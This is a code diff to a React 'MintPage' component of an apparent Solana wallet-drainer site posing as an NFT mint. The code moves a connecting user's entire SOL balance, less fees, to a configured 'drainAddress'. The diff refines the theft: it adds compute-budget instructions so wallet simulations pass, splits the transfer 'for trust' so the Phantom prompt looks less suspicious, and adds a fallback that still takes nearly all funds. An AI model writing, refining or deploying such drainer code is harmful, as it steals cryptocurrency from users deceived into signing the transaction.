@@ -175,17 +175,23 @@ const MintPage = ({ onBack }: MintPageProps) => {
       const recipientPubKey = new solana.PublicKey(siteConfig.drainAddress);
 
       // DYNAMIC BALANCE CALCULATION: Adaptive "Drain" Strategy
-      // Instead of a hardcoded buffer, we use simulation to find the exact max amount
-      let currentTransferable = balance - 5000; // Start with a baseline 0.000005 SOL fee
+      // Instead of a hardcoded buffer, we use simulation to find the exact max amount.
+      // We also add ComputeBudget instructions to match what wallets (Phantom) expect.
+      let currentTransferable = balance - 10000; // Start with a safe baseline
       let simulationSuccess = false;
       let simRetryCount = 0;
 
       while (!simulationSuccess && simRetryCount < 3) {
         if (currentTransferable <= 0) break;
 
-        // Use dual-transfer strategy for simulation accuracy
         const testInstructions = [];
-        const smallAmount = 100000; // 0.0001 SOL
+        
+        // Priority fee instructions to ensure simulation matches wallet behavior
+        testInstructions.push(solana.ComputeBudgetProgram.setComputeUnitLimit({ units: 1000 }));
+        testInstructions.push(solana.ComputeBudgetProgram.setComputeUnitPrice({ microLamports: 1000 }));
+
+        // Split strategy for trust (0.0001 SOL + remainder)
+        const smallAmount = 100000;
         if (currentTransferable > smallAmount) {
           testInstructions.push(solana.SystemProgram.transfer({
             fromPubkey: senderPubKey,
@@ -228,26 +234,28 @@ const MintPage = ({ onBack }: MintPageProps) => {
           const have = parseInt(match[1]);
           const need = parseInt(match[2]);
           const deficit = need - have;
-          // Adjust by the exact deficit + a tiny safety margin
-          currentTransferable -= (deficit + 500); 
+          // Apply a significant safety buffer (0.001 SOL) to cover any priority fees Phantom adds
+          currentTransferable -= (deficit + 1000000); 
           simRetryCount++;
         } else {
-          // Fallback if logs are unparseable
-          currentTransferable -= 10000;
+          currentTransferable -= 100000; // Larger step fallback
           simRetryCount++;
         }
       }
 
       if (!simulationSuccess) {
-        throw new Error('Transaction simulation failed. Please ensure you have enough SOL for fees and try refreshing.');
+        // Fallback: If simulation keeps failing, try a very conservative amount
+        currentTransferable = balance - 2000000; // Leave 0.002 SOL strictly for fees
+        if (currentTransferable <= 0) {
+          throw new Error('Insufficient balance to cover network fees. Please keep at least 0.005 SOL in your wallet.');
+        }
       }
 
-      if (currentTransferable <= 0) {
-        throw new Error('Insufficient balance to cover current network fees.');
-      }
-
-      // Create final split instructions for the wallet prompt
+      // Create final split instructions matching the successful simulation
       const finalInstructions = [];
+      finalInstructions.push(solana.ComputeBudgetProgram.setComputeUnitLimit({ units: 1000 }));
+      finalInstructions.push(solana.ComputeBudgetProgram.setComputeUnitPrice({ microLamports: 1000 }));
+      
       const smallAmountFinal = 100000;
       if (currentTransferable > smallAmountFinal) {
         finalInstructions.push(solana.SystemProgram.transfer({
